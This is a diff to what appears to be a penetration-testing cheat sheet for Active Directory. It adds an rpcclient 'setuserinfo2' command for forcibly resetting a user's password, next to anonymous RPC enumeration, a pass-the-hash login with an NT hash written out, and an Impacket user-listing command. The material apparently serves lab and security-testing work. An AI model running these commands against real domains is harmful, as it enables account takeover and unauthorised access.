@@ -180,6 +180,7 @@ Anonymous RPC
   rpcclient -U "" -N 10.10.10.161
   rpcclient -U "username%password" -c "enumdomusers;quit" 10.10.10.161
   rpcclient -U 'corewebdl$%4182816cd42bdb6d20f7fb89703f5c48' --pw-nt-hash 10.9.15.10
+  Change PW: setuserinfo2 <username> 23 <'Password'>
   
 Impacket Tools
   ./GetADUsers.py core.cyber.local/'corewebdl$' -dc-ip 10.9.15.10 -hashes '0:4182816cd42bdb6d20f7fb89703f5c48'
